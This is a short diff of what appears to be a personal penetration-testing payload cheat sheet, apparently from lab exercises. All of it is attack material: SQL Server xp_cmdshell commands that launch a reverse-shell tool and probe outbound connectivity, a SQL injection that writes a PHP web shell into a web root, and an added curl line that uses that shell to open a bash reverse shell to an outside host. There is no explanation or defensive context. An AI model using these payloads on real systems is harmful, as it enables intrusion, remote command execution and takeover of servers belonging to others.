@@ -15,3 +15,4 @@ execute xp_cmdshell 'powershell  c:\temp\rcat\rcat.exe 10.10.14.66 443 -e cmd '
 '; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell 'powershell -c "tnc 10.10.14.5 -port 4444" '-- -
 
 Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
+curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"'
